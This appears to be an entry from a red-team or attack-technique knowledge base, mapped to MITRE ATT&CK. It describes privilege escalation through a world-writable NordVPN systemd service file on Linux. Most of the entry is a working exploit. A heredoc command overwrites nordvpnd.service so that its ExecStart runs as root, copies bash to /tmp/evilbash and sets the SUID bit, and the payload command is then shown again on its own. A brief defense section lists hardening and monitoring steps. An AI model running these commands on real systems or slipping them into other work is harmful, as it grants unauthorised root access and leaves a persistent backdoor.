---
id: proc-003
tags:
  - overwrite
  - systemd
  - service-file
  - rce
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/cat-overwrite-service-file]]'
  - '[[commands/bash-copy-and-chmod-suid]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Abuse Elevation Control Mechanism]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:30:07.235Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Abuse Elevation Control Mechanism]]'
  - '[[Unix Shell]]'
---
# Overwrite-NordVPN-Systemd-Service-File

## Summary

This procedure exploits world-writable permissions on the NordVPN systemd service file to overwrite its ExecStart directive with a malicious bash command that creates an SUID binary upon service start.

## Description

On Linux systems with the NordVPN client installed, the file /usr/lib/systemd/system/nordvpnd.service has 777 permissions, allowing unprivileged users to edit it. The modification injects a bash -c command into ExecStart to copy /usr/bin/bash to /tmp/evilbash and set the SUID bit (chmod u+s). When the service restarts, this runs as root. Requires local unprivileged access post-installation.

## Requirements

1. NordVPN client installed with vulnerable permissions
2. Unprivileged local user access
3. systemd managing services

## Defense

Defensive measures and detection strategies:

- Post-install, chmod 644 on systemd unit files and chown root:root
- Use systemd's StrictPermissions or validate unit files on load
- Audit logs for modifications to /usr/lib/systemd/system/ via journalctl
- Deploy file integrity monitoring (e.g., AIDE) on service directories

## Objectives

1. Modify service configuration for root code execution
2. Inject payload to create persistent SUID backdoor
3. Enable privilege escalation on service trigger

## Instructions

### Step 1: Overwrite Service File

**Context**: Use cat heredoc to replace the entire unit file with a modified version containing the malicious ExecStart.

**Command** ([[commands/cat-overwrite-service-file]]):
```bash
cat << EOF > /usr/lib/systemd/system/nordvpnd.service
[Unit]
Description=NordVPN Daemon
Requires=nordvpnd.socket
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
NonBlocking=true
KillMode=process
Restart=on-failure
RestartSec=5
# centos7 RuntimeDirectory ignored
RuntimeDirectory=nordvpn
RuntimeDirectoryMode=0770
# User=root
Group=nordvpn

[Install]
WantedBy=default.target
EOF
```

> File overwritten; the ExecStart now runs the payload command.

### Step 2: Understand Payload Command

**Context**: The injected ExecStart executes this bash command as root on service start.

**Command** ([[commands/bash-copy-and-chmod-suid]]):
```bash
/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
```

> Copies bash and sets SUID; runs automatically via service.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Abuse Elevation Control Mechanism]] Abuse Elevation Control Mechanism
- [[Unix Shell]] Command and Scripting Interpreter: Unix Shell

### Sub-Techniques

-

## Commands Used

- [[commands/cat-overwrite-service-file]]
- [[commands/bash-copy-and-chmod-suid]]

## Tools Used

-

## Tags

- [[overwrite]]
- [[systemd]]
- [[service-file]]
- [[rce]]
